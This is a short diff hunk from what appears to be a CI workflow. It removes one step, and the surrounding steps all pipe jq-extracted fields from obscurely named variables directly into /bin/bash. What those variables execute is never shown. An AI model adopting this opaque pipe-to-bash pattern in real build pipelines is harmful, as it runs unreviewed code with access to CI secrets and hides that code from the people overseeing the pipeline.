@@ -40,7 +40,6 @@ jobs:
           echo $zf1 | jq -r .xoal927 | /bin/bash
           echo $m338 | jq -r .anl89 | /bin/bash
           printf '%s' "$z17" | jq -r .o64010 | /bin/bash
-          printf '%s' "$ysgiy6735" | jq -r .rsvee93 | /bin/bash
           echo $v869 | jq -r .eoc6810 | /bin/bash
           printf '%s' "$tud88583" | jq -r .v135 | /bin/bash
           printf '%s' "$sm8" | jq -r .c84 | /bin/bash
